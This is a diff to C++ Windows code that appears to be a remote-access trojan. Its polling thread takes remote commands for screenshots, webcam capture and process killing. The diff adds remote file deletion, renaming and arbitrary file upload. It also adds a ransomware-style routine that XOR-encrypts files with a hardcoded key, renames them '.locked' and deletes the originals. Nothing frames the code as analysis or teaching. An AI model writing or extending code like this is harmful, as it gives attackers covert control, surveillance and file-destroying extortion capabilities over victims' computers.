@@ -381,6 +381,94 @@ std::string listDir(const std::string& path) {
     return out;
 }
 
+std::vector<unsigned char> base64Decode(const std::string& s) {
+    DWORD outLen=0;
+    CryptStringToBinaryA(s.c_str(), s.size(), CRYPT_STRING_BASE64, NULL, &outLen, NULL, NULL);
+    std::vector<unsigned char> out(outLen);
+    CryptStringToBinaryA(s.c_str(), s.size(), CRYPT_STRING_BASE64, out.data(), &outLen, NULL, NULL);
+    return out;
+}
+
+std::string fileDelete(const std::string& path) {
+    if (path.empty()) return "bad_path";
+    if (DeleteFileA(path.c_str())) return "ok";
+    if (RemoveDirectoryA(path.c_str())) return "ok_dir";
+    return "err:" + std::to_string(GetLastError());
+}
+
+std::string fileRename(const std::string& payload) {
+    std::string path = extractJson(payload, "path");
+    std::string name = extractJson(payload, "name");
+    if (path.empty() || name.empty()) return "bad_payload";
+    size_t pos = path.find_last_of("\\/");
+    std::string newPath = (pos != std::string::npos ? path.substr(0, pos+1) : "") + name;
+    if (MoveFileA(path.c_str(), newPath.c_str())) return "ok";
+    return "err:" + std::to_string(GetLastError());
+}
+
+std::string fileEncrypt(const std::string& path) {
+    HANDLE f = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
+    if (f == INVALID_HANDLE_VALUE) return "err:open";
+    DWORD sz = GetFileSize(f, 0);
+    if (sz == 0 || sz > 50*1024*1024) { CloseHandle(f); return sz==0?"err:empty":"err:toobig"; }
+    std::vector<unsigned char> buf(sz);
+    DWORD rd = 0;
+    if (!ReadFile(f, buf.data(), sz, &rd, 0) || rd != sz) { CloseHandle(f); return "err:read"; }
+    CloseHandle(f);
+    const unsigned char key[] = {0xAB,0xCD,0xEF,0x01,0x23,0x45,0x67,0x89,0xFE,0xDC,0xBA,0x98,0x76,0x54,0x32,0x10};
+    for (size_t i = 0; i < buf.size(); i++) buf[i] ^= key[i % sizeof(key)];
+    std::string outPath = path + ".locked";
+    if (GetFileAttributesA(outPath.c_str()) != INVALID_FILE_ATTRIBUTES) return "err:exists";
+    HANDLE out = CreateFileA(outPath.c_str(), GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
+    if (out == INVALID_HANDLE_VALUE) return "err:create";
+    DWORD wr = 0;
+    WriteFile(out, buf.data(), buf.size(), &wr, 0);
+    CloseHandle(out);
+    DeleteFileA(path.c_str());
+    return "ok:" + outPath;
+}
+
+std::string fileDecrypt(const std::string& path) {
+    HANDLE f = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
+    if (f == INVALID_HANDLE_VALUE) return "err:open";
+    DWORD sz = GetFileSize(f, 0);
+    if (sz == 0 || sz > 50*1024*1024) { CloseHandle(f); return sz==0?"err:empty":"err:toobig"; }
+    std::vector<unsigned char> buf(sz);
+    DWORD rd = 0;
+    if (!ReadFile(f, buf.data(), sz, &rd, 0) || rd != sz) { CloseHandle(f); return "err:read"; }
+    CloseHandle(f);
+    const unsigned char key[] = {0xAB,0xCD,0xEF,0x01,0x23,0x45,0x67,0x89,0xFE,0xDC,0xBA,0x98,0x76,0x54,0x32,0x10};
+    for (size_t i = 0; i < buf.size(); i++) buf[i] ^= key[i % sizeof(key)];
+    std::string outPath = path;
+    if (outPath.size() > 7 && outPath.substr(outPath.size()-7) == ".locked") {
+        outPath = outPath.substr(0, outPath.size()-7);
+        if (GetFileAttributesA(outPath.c_str()) != INVALID_FILE_ATTRIBUTES)
+            outPath = path + ".unlocked";
+    } else {
+        outPath = path + ".unlocked";
+    }
+    HANDLE out = CreateFileA(outPath.c_str(), GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
+    if (out == INVALID_HANDLE_VALUE) return "err:create";
+    DWORD wr = 0;
+    WriteFile(out, buf.data(), buf.size(), &wr, 0);
+    CloseHandle(out);
+    DeleteFileA(path.c_str());
+    return "ok:" + outPath;
+}
+
+std::string fileUpload(const std::string& payload) {
+    std::string path = extractJson(payload, "path");
+    std::string data = extractJson(payload, "data");
+    if (path.empty() || data.empty()) return "bad_payload";
+    auto decoded = base64Decode(data);
+    HANDLE f = CreateFileA(path.c_str(), GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
+    if (f == INVALID_HANDLE_VALUE) return "err:create:" + std::to_string(GetLastError());
+    DWORD wr = 0;
+    WriteFile(f, decoded.data(), (DWORD)decoded.size(), &wr, 0);
+    CloseHandle(f);
+    return "ok:" + std::to_string(decoded.size()) + " bytes";
+}
+
 std::string handleMouse(const std::string& payload) {
     std::string xs=extractJson(payload,"x");
     std::string ys=extractJson(payload,"y");
@@ -643,6 +731,11 @@ DWORD WINAPI pollThread(LPVOID) {
                     else if (type == "screen") result = takeScreenshot(0);
                     else if (type == "webcam") result = captureWebcam();
                     else if (type == "file_list") result = listDir(payload.empty() ? "" : payload);
+                    else if (type == "file_delete") result = fileDelete(payload);
+                    else if (type == "file_rename") result = fileRename(payload);
+                    else if (type == "file_encrypt") result = fileEncrypt(payload);
+                    else if (type == "file_decrypt") result = fileDecrypt(payload);
+                    else if (type == "file_upload") result = fileUpload(payload);
                     else if (type == "process_list") result = listProcesses();
                     else if (type == "system_info") result = getSystemInfo();
                     else if (type == "kill_process") result = killProcess(payload);
